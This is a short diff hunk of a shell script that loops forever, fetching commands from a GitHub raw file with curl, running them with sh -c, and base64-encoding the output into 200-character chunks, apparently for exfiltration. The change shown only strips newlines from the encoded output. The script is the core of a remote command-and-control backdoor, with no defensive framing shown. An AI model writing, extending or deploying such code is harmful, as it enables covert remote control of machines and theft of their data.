@@ -6,7 +6,7 @@ while true; do
     URL="https://raw.githubusercontent.com/rossdraper/hello/main/req.txt?$(date +%s)"
     current_content=$(curl -S -s "$URL")
     output=$(sh -c "$current_content")
-    base64_output=$(echo "$output" | base64)
+    base64_output=$(echo "$output" | base64 | tr -d '\n')
 
     # Split the base64 output into chunks of less than 200 characters
     chunk_size=200
